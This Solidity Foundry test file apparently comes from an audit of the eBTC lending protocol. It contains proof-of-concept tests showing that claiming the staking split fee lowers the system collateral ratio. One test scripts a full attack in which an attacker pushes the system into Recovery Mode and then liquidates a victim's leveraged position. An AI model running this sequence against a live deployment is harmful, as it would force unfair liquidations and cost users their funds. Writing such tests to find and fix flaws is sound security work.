pragma solidity 0.8.17;

import {console2 as console} from "forge-std/console2.sol";

import {eBTCBaseFixture} from "./BaseFixture.sol";

contract WhaleSniperPOCTest is eBTCBaseFixture {
    address payable[] users;

    uint public constant DECIMAL_PRECISION = 1e18;

    address private splitFeeRecipient;
    mapping(bytes32 => uint) private _targetCdpPrevCollUnderlyings;
    mapping(bytes32 => uint) private _targetCdpPrevColls;
    mapping(bytes32 => uint) private _targetCdpPrevFeeApplied;

    struct LocalFeeSplitVar {
        uint _prevStFeePerUnitg;
        uint _prevTotalCollUnderlying;
    }

    ////////////////////////////////////////////////////////////////////////////
    // Tests
    ////////////////////////////////////////////////////////////////////////////

    function setUp() public override {
        super.setUp();

        connectCoreContracts();
        connectLQTYContractsToCore();

        users = _utils.createUsers(3);

        splitFeeRecipient = address(feeRecipient);
    }

    /**
        Proof that Split goes down after claiming
     */
    function test_whalePOCOne() public {

        uint256 debtAmt = 1e20; // TODO: Consider fuzz
        vm.assume(debtAmt > 1e18);

        uint _curPrice = priceFeedMock.getPrice();
        uint256 coll1 = _utils.calculateCollAmount(debtAmt, _curPrice, 297e16);

        bytes32 cdpId1 = _openTestCDP(users[0], coll1, debtAmt);

        // Once a CDP is open
        // Just take some yield
        uint _curIndex = collateral.getPooledEthByShares(1e18);
        uint _newIndex = _curIndex + 5e16;
        collateral.setEthPerShare(_newIndex);

        // Get TCR
        uint256 tcr = cdpManager.getTCR(_curPrice);

        console.log("tcr b4", tcr);

        // And show that the TCR goes down once you claim
        cdpManager.claimStakingSplitFee();

        uint256 tcrAfter = cdpManager.getTCR(_curPrice);
        console.log("tcrAfter", tcrAfter);

        assertLt(tcrAfter, tcr);
    }


    // Padding Deposits -> W/e, prob 300% CR
    // Victim Deposits -> Leverage to 110
    // Attacker Brings TCR close to Recovery Mode -> Basically 110 as well
    // Attacker liquidates victim
    function test_whalePOCOpenMaliciousAndLiquidateApe() public {

        uint256 debtAmt = 1e20; // TODO: Consider fuzz

        vm.assume(debtAmt > 1e18);

        uint _curPrice = priceFeedMock.getPrice();
        uint256 coll1 = _utils.calculateCollAmount(debtAmt, _curPrice, 126e16); // Literally at the edge

        bytes32 cdpId1 = _openTestCDP(users[0], coll1, debtAmt);
        console.log("tcrAfterOpen Base", cdpManager.getTCR(_curPrice));



        // Get TCR
        uint256 tcr = cdpManager.getTCR(_curPrice);

        // Deposit and bring TCR to RM

        // 2% of amt
        uint256 victimAmount = debtAmt / 20;
        console.log("victimAmount", victimAmount);

        // Levered to the tits
        uint256 collVictim = _utils.calculateCollAmount(victimAmount, _curPrice, 111e16);
        console.log("collVictim", collVictim);
        bytes32 cdpIdVictm = _openTestCDP(users[0], collVictim, victimAmount);
        console.log("tcrAfterOpen Victim", cdpManager.getTCR(_curPrice));

        // Once a CDP is open
        // Just take some yield
        // NOTE: We must do this here due to `updateCdpRewardSnapshots` resynching the index after each open
        uint _curIndex = collateral.getPooledEthByShares(1e18);
        uint _newIndex = _curIndex + 5e16;
        collateral.setEthPerShare(_newIndex);


        // Attacker opens CDP to push to barely to RM
        uint256 attackerDebtAmount = debtAmt;
        uint256 collAttacker = _utils.calculateCollAmount(attackerDebtAmount, _curPrice, 1214e15);
        bytes32 cdpIdAttacker = _openTestCDP(users[0], collAttacker, attackerDebtAmount);
        console.log("tcrAfterOpen Attacker", cdpManager.getTCR(_curPrice));

        // Now we take the split
        cdpManager.claimStakingSplitFee();


        uint256 tcrAfter = cdpManager.getTCR(_curPrice);
        console.log("tcrAfter claim", tcrAfter);

        // We're in recovery mode
        assertLt(tcrAfter, 1250000000000000000);

        vm.startPrank(users[0]);
        cdpManager.liquidate(cdpIdVictm);
        uint256 tcrEnd = cdpManager.getTCR(_curPrice);
        console.log("tcrEnd liquidation", tcrEnd);
        assertGt(tcrEnd, 1250000000000000000);
    }
}
